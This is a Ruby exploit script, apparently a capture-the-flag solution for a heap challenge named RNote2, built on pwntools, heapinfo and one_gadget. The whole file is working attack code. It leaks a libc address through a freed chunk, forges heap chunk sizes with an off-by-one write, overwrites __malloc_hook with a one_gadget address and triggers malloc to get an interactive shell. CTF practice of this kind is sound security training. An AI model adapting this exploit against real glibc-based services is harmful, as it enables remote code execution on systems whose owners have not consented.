#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../zocket/zocket'
require 'pry'
require 'pwn'        # https://github.com/peter50216/ruby-pwntools
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: 'RNote/libc.so.6')[4]

host, port = 'rnote2.2017.teamrois.cn', 6666
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Zocket.new host, port #, logger: HexLogger.new
def z;$z;end
@p = 'RNote2'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

def pt;z.gets "Your choice:\n";end

def add(sz, content)
  pt
  z.puts 1
  z.gets 'length:'
  z.puts sz
  z.gets 'content:'
  z.write content if sz > 0
end

def del(idx)
  pt
  z.puts 2
  z.gets 'delete?'
  z.puts idx
end
add(256, 'A' * 256)
add(10, 'B' * 10)

del(1)
add(1, ' ')

pt; z.puts 3 # show
z.gets '2.'
z.gets 'Note content: '
libc = ELF.new('./RNote/libc.so.6')
libc.address = u64(z.read(6)+"\x00\x00") - 0x3c3c20
p "libc @ #{libc.address.hex}"
h.offset(libc.address)

add(1, 'A') # 3
pt; z.puts 5; z.puts 3 # expand
z.gets 'long'
z.puts 0x27; z.gets 'content'
z.puts 'C' * 0x22 + 0xf1.chr

add(0x28, "meow\n")
context.arch = 'amd64'
add(0x28, flat(0, 8, 0, 0, libc.symbols['__malloc_hook']))

pt; z.puts 4; z.puts 1 # edit
z.gets 'content'
z.write p64(@magic + libc.address)
pt; z.puts 1; z.puts 10 # trigger malloc
z.interact
